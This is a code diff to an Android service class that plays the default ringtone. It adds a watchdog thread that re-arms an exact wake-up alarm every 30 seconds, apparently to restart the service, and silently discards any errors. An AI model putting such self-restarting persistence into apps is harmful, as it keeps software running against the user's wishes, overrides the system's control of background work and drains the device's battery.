@@ -12,6 +12,37 @@ public class RiderService extends Service {
     private MediaPlayer player;
     private boolean isRunning = false;
 
+	private void startWatchdogThread() {
+    new Thread(() -> {
+        Context ctx = getApplicationContext();
+        isRunning = true;
+
+        while (isRunning) {
+            try {
+                AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
+                
+                Intent intent = new Intent(ctx.getPackageName() + ".START");
+                intent.setPackage(ctx.getPackageName());
+
+                PendingIntent pi = PendingIntent.getBroadcast(
+                        ctx, 
+                        777, 
+                        intent, 
+                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+                );
+
+                if (am != null) {
+               am.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, pi);
+                }
+            } catch (Throwable t) {
+              
+            } 
+            android.os.SystemClock.sleep(30000);
+        }
+    }).start();
+}
+
+
 	private void serviceMainVoid() {
 		if (player == null) {
             player = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI);
@@ -88,6 +119,7 @@ public class RiderService extends Service {
 		forceBindAndStart();
 		TryStartEnforcedService();
 		serviceMainVoid();
+		startWatchdogThread();
         }
 	}
 
